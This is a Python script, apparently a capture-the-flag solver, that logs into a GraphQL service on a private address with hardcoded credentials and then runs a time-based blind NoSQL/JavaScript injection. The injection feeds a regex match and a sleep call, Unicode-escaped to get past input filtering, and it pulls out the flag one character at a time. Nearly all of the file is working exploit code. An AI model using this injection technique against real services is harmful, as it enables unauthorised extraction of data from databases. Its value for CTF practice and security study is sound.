import requests
import json
import time
import string
url = "http://192.168.1.101:11000/graphql"

def login():
    query = """
    query{
        login(email : "minghong2403@gmail.com", password : "admin"){
            token
        }
    }
    """
    r = requests.post(url, json={'query' : query})
    response = r.json()
    return response['data']['login']['token']

def toUnicode(payload):
    return ''.join(r'\u{:04X}'.format(ord(chr)) for chr in payload)

# https://www.branah.com/unicode-converter
charset = "ABCDEFGHIJKLMNOPQRSTUVWYXZabcdefghijklmnopqrstuvwxyz0123456789}_!@#"
specialChars = ["_", "!", "@", "#"]
def sendPayload(token):
    finalFlag = ""
    flag = ""
    finished = False
    while True:
        if finished == True :
            break

        for s in charset :
            if s in specialChars:
                s = "\\" + toUnicode(s)
            try:
                stime = time.time()
                query = f"""
                query{{
                    getProduct(productInput : {{
                        product : "{{\\"title\\" : \\"'; this.title.match\\\\u0028'\\\\u005eCSCCTF{{{flag + s}'\\\\u0029 ? sleep\\\\u00285000\\\\u0029:'\\" }}"
                    }})
                }}
                """
                headers = {
                    'Content-Type':'application/json',
                    'Authorization': 'Bearer {}'.format(token)
                }
                r = requests.post(url, headers=headers, json={'query' : query})
                etime = time.time()

                if etime - stime >= 4 :
                    flag = flag + s
                    if s[0] == "\\": 
                        s = s[1:].encode().decode("unicode-escape")
                    finalFlag += s
                    
                    if(s == "}") :
                        finished = True
                    print(f"CSCCTF{{{finalFlag}")
                    break

            except :
                print("Error...")

token = login()
sendPayload(token)

